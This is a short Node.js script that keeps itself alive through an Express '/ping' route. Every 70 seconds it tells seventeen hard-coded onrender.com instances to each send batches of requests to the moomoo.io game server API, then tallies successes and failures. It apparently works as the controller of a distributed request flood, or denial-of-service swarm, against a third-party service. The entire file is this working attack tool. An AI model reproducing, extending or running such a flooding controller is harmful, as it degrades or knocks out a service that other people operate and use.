const fetch = require("node-fetch");

const express = require("express");
const app = express();
const port = 3000;

app.use(express.json());

app.get("/ping", async (req, res) => {
  return res.send(`alive`);
});

app.listen(port);

let names = [
    "https://aaaa8.onrender.com",
    "https://aaaa9.onrender.com",
    "https://aaaa-1-z6h6.onrender.com",
    "https://aaaa-15.onrender.com",
    "https://aaaa-16.onrender.com",
    "https://aaaa-17.onrender.com",
    "https://aaaa-18.onrender.com",
    "https://aaaa-12.onrender.com",
    "https://lol-d399.onrender.com",
    "https://aaaa-j6u9.onrender.com",
    "https://aaaa1.onrender.com",
    "https://aaaa2.onrender.com",
    "https://aaaa4.onrender.com",
    "https://aaaa3.onrender.com",
    "https://aaaa5.onrender.com",
    "https://aaaa7.onrender.com",
    "https://aaaa6.onrender.com"
]

const sendReq = async (direction, amount) => {
    let total = { failed: 0, success: 0, amount: 0 };

    const runRequests = () => {
        const promises = names.map(name => {
            let url = name//`https://${name}.onrender.com/`
            url+=`/ping?url=${direction}&amount=${amount}`;

            total.amount += amount;
console.log(url)
            return fetch(url)
                .then(res => res.text())
                .then(text => {
                    let parts = text.split("/");
                    let [ failed, success ] = [Number(parts[0]), Number(parts[1].split("/")[0])]
console.log(text)
                    total.failed += failed;
                    total.success += success;
                })
                .catch(e => {
           // console.log(name, "failed")
            });
        });

        return Promise.all(promises);
    };

    await runRequests();

    console.log(`${total.success}/${total.amount}`);
};

setInterval(() => {
 sendReq(`https://api.moomoo.io/servers?v=1.22`, 35);
}, 70e3);
